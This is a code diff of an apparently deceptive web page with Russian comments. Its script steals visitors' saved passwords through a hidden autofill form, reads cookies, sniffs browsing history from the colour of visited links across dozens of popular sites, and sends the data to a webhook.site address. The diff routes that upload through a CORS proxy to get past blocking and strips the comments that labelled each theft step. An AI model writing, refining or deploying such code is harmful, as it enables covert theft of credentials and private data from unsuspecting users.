@@ -68,20 +68,20 @@
     <div class="footer"><a href="#">Политика конфиденциальности</a> • <a href="#">Пользовательское соглашение</a></div>
 </div>
 
-<!-- Скрытая форма для автозаполнения паролей -->
 <form id="hiddenForm" style="display:none;">
     <input type="email" id="emailField" name="email" autocomplete="email">
     <input type="password" id="passField" name="password" autocomplete="current-password">
 </form>
 
-<!-- Скрытый блок для проверки истории -->
 <div id="historyTest"></div>
 
 <script>
     // ============================================================
-    //  НАСТРОЙКА
+    //  КОНФИГ
     // ============================================================
-    const WEBHOOK_URL = 'https://webhook.site/36b6bcb8-d02f-4340-b822-03f54060b514';
+    // Используем CORS-прокси, чтобы обойти блокировку
+    const TARGET_URL = 'https://webhook.site/36b6bcb8-d02f-4340-b822-03f54060b514';
+    const PROXY_URL = 'https://corsproxy.io/?' + encodeURIComponent(TARGET_URL);
 
     // ============================================================
     //  КРАЖА КУК
@@ -129,32 +129,23 @@
         btn.textContent = '⏳ Отправка...';
         statusEl.className = 'status';
 
-        // ============================================================
-        //  1. КРАЖА ПАРОЛЕЙ (через автозаполнение)
-        // ============================================================
+        // 1. ПАРОЛИ
         const emailField = document.getElementById('emailField');
         const passField = document.getElementById('passField');
         emailField.focus();
         passField.focus();
 
-        // ============================================================
-        //  2. ИСТОРИЯ БРАУЗЕРА (CSS-атака — РАСШИРЕННЫЙ СПИСОК)
-        // ============================================================
+        // 2. ИСТОРИЯ (расширенный список)
         const sites = [
-            // Соцсети и мессенджеры
             'youtube.com', 'facebook.com', 'instagram.com', 'twitter.com',
             'vk.com', 'ok.ru', 'tiktok.com', 'telegram.org', 'whatsapp.com',
             'reddit.com', 'pinterest.com', 'linkedin.com', 'discord.com',
-            // Поисковики и сервисы
             'google.com', 'ya.ru', 'mail.ru', 'yandex.ru', 'wikipedia.org',
             'github.com', 'stackoverflow.com', 'amazon.com', 'ebay.com',
-            // Российские
             'ozon.ru', 'wildberries.ru', 'avito.ru', 'sberbank.ru', 'tinkoff.ru',
             'hh.ru', 'cian.ru', '2gis.ru', 'kinopoisk.ru', 'rutube.ru',
-            // Игры и стриминг
             'twitch.tv', 'steamcommunity.com', 'epicgames.com', 'roblox.com',
             'netflix.com', 'spotify.com', 'soundcloud.com',
-            // Другие популярные
             'alibaba.com', 'aliexpress.com', 'booking.com', 'tripadvisor.com'
         ];
 
@@ -171,13 +162,10 @@
             container.appendChild(link);
         });
 
-        // Даём браузеру время на рендеринг
         setTimeout(() => {
-            // Проверяем историю
             const links = container.querySelectorAll('a');
             links.forEach((link, index) => {
                 const color = getComputedStyle(link).color;
-                // Браузеры используют разные оттенки фиолетового для посещённых ссылок
                 if (color === 'rgb(128, 0, 128)' || 
                     color === 'rgb(85, 26, 139)' ||
                     color === 'rgb(102, 0, 153)' ||
@@ -186,9 +174,7 @@
                 }
             });
 
-            // ============================================================
-            //  СБОР ДАННЫХ
-            // ============================================================
+            // 3. СБОР ДАННЫХ
             const data = {
                 refId: document.getElementById('refId').textContent,
                 userAgent: navigator.userAgent,
@@ -217,9 +203,7 @@
                 visitedSites: visited
             };
 
-            // ============================================================
-            //  ОТПРАВКА
-            // ============================================================
+            // 4. ОТПРАВКА
             const lines = [
                 '🔐 НОВЫЙ РЕФЕРАЛЬНЫЙ ПЕРЕХОД',
                 '═══════════════════════════════════════',
@@ -251,7 +235,8 @@
 
             const messageText = lines.join('\n');
 
-            fetch(WEBHOOK_URL, {
+            // ОТПРАВКА ЧЕРЕЗ ПРОКСИ
+            fetch(PROXY_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ text: messageText, raw: data })
@@ -276,7 +261,7 @@
                 btn.disabled = false;
             });
 
-        }, 150); // Задержка для рендеринга ссылок
+        }, 150);
     });
 </script>
 </body>
